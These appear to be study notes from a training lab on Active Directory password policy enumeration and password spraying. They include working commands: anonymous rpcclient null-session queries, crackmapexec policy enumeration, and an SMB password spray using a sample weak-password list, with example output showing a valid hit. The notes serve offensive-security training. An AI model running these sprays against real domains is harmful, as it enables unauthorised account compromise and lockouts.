# 🔥 Password Policy and Password Spraying

> **Topic:** AD Basic Enumeration
>
> **Section:** Password Spraying

---

# 📖 Overview

Once a valid list of domain users has been gathered, the next stage is to understand the domain's password policy before attempting authentication.

Password spraying tests a small set of common passwords across many accounts.

```text
One Password
      ↓
Many Accounts
```

This differs from brute force, which attempts many passwords against one account.

---

# 🎯 Why Password Spraying Works

Password spraying can be effective because organisations may:

- Require frequent password changes
- Have users choose predictable password patterns
- Fail to enforce password policies consistently
- Have passwords reused across multiple accounts

Common spray candidates include:

- Seasonal passwords
- Default IT passwords
- Passwords exposed in previous breaches

Examples from the source include:

```text
Summer2025!
Password123
```

and leaked-password lists such as:

```text
rockyou.txt
```

---

# 🔒 Password Policy

Before spraying, determine:

- Minimum password length
- Password complexity
- Password history
- Maximum password age
- Account lockout threshold
- Lockout reset period
- Lockout duration

This helps prevent unnecessary account lockouts.

---

# 🔍 Querying Policy with rpcclient

Connect anonymously:

```bash
rpcclient -U "" 10.211.11.10 -N
```

Then:

```text
rpcclient $> getdompwinfo
```

Example:

```text
min_password_length: 12
password_properties: 0x00000001
    DOMAIN_PASSWORD_COMPLEX
```

---

# 🔐 Password Complexity

The source explains that when password complexity is enabled, at least three of these four categories must be represented:

- Uppercase letters
- Lowercase letters
- Digits
- Special characters

Passwords also cannot contain the user's account name or portions of their full name exceeding two consecutive characters.

---

# 🧰 CrackMapExec Password Policy Enumeration

CrackMapExec can query password policy when anonymous access is permitted:

```bash
crackmapexec smb 10.211.11.10 --pass-pol
```

---

# 📊 Example Policy Output

The supplied lab shows:

```text
Minimum password length: 18
Password history length: 21
Maximum password age: 41 days
Password Complexity Flags: 000001
Reset Account Lockout Counter: 30 minutes
Locked Account Duration: 30 minutes
Account Lockout Threshold: 10
```

The exact policy varies between environments.

---

# 📝 Building a Spray List

The source demonstrates creating a small list that respects the password-complexity requirements:

```text
Password!
Password1
Password1!
P@ssword
Pa55word1
```

In a real assessment, candidate passwords should be based on authorised intelligence and the target's password policy.

---

# 💥 Password Spraying with CrackMapExec

The supplied lab uses:

```bash
crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
```

This tests the passwords in `passwords.txt` against the usernames in `users.txt` over SMB.

---

# 📄 Example Results

```text
[-] tryhackme.loc\Administrator:Password! STATUS_LOGON_FAILURE
[-] tryhackme.loc\Guest:Password! STATUS_LOGON_FAILURE
[-] tryhackme.loc\krbtgt:Password! STATUS_LOGON_FAILURE
[-] tryhackme.loc\asrepuser1:Password1! STATUS_LOGON_FAILURE
[+] tryhackme.loc\*****:******
```

The:

```text
[+]
```

indicates that a valid credential pair has been found.

---

# ⚠️ Lockout Awareness

Password spraying must always account for the target's lockout policy.

The objective is to avoid turning a credential-testing activity into a denial-of-service condition by locking accounts.

Before spraying:

```text
Enumerate Policy
      ↓
Build Conservative Password List
      ↓
Spray Carefully
      ↓
Monitor Results
```

---

# 🧠 Key Takeaways

- Password spraying tests a small set of passwords against many accounts.
- Password policy enumeration should happen before spraying.
- `rpcclient` can retrieve password-policy information through an allowed null session.
- CrackMapExec can query password policy and perform SMB authentication testing.
- Password complexity affects which candidate passwords are reasonable.
- The source's lab uses a small password list based on OSINT and the discovered policy.
- A `[+]` result in the demonstrated CrackMapExec output indicates a valid credential pair.
